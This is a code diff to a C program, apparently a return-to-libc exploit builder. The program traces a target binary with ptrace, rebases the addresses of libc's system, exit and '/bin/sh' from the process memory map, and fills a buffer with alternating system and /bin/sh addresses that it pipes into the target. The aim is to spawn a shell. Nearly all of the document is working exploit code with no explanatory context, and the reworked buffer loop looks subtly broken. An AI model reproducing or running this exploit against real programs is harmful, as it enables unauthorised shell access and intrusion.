@@ -7,13 +7,9 @@
 #include <asm/unistd.h>
 #include <sys/reg.h>
 
-static off_t const exitofft = 0x2de10;
-static off_t const systemofft = 0x380b0;
-static off_t const binshofft = 0x1243ff;
-
-static unsigned long exitvaddr = 0x2de10;
-static unsigned long systemvaddr = 0x380b0;
-static unsigned long binshvaddr = 0x1243ff;
+static unsigned long exitvaddr		= 0x2de10;
+static unsigned long systemvaddr	= 0x380b0;
+static unsigned long binshvaddr		= 0x1243ff;
 
 static void ril_unblock_child(pid_t child)
 {
@@ -41,7 +37,6 @@ static int ril_ptrace(pid_t child)
 		}
 		ptrace(PTRACE_SYSCALL, child, NULL, NULL);
 	}
-    ril_unblock_child(child);
     return 0;
 }
 
@@ -84,8 +79,13 @@ static int ril_matchline_map_file(char *const line)
 		exitvaddr += start_vaddr;
 		systemvaddr += start_vaddr;
 		binshvaddr += start_vaddr;
+		fprintf(stdout, "target_func_vaddr[system=%lx, exit=%lx, /bin/sh=%lx\n]",
+				systemvaddr,
+				exitvaddr,
+				binshvaddr);
+		return 1;
 	}
-	return 1;
+	return 0;
 }
 
 static int ril_read_map_file(FILE * fp)
@@ -112,7 +112,15 @@ void ril_make_buffer(char **buffer, pid_t pid, size_t noplen)
     allocsize = (rest + noplen) * sizeof(unsigned long) + 2;
     nbiter = allocsize / 3;
     *buffer = malloc(allocsize);
-    ptr = (unsigned long*)(*buffer);
+    ptr = (*buffer) + allocsize;
+	while(ptr - 2 > *buffer){
+		*ptr = systemvaddr;
+		ptr--;
+		*ptr = binshvaddr;
+		ptr--;
+	}
+
+	/*
     for( i = 0; i < allocsize; ++i) {
         *ptr = systemvaddr; 
         ptr++;
@@ -121,6 +129,7 @@ void ril_make_buffer(char **buffer, pid_t pid, size_t noplen)
         *ptr = binshvaddr;
         ptr++;
     }
+	*/
 }
 
 int main(int argc, char *argv[])
@@ -149,6 +158,7 @@ int main(int argc, char *argv[])
 		close(fdpipe[1]);
 		ptrace(PTRACE_TRACEME, 0, 0, 0);
 		execl(argv[1], argv[1], NULL);
+		exit(0);
 	} else {
         int ret = ril_ptrace(pid);
         if(ret == 0) {
@@ -166,7 +176,6 @@ int main(int argc, char *argv[])
 		close(fdpipe[0]);
 		dup2(fdpipe[1], STDOUT_FILENO);
 		puts(buffer);
-		wait(NULL);
 	}
 
 	return 0;
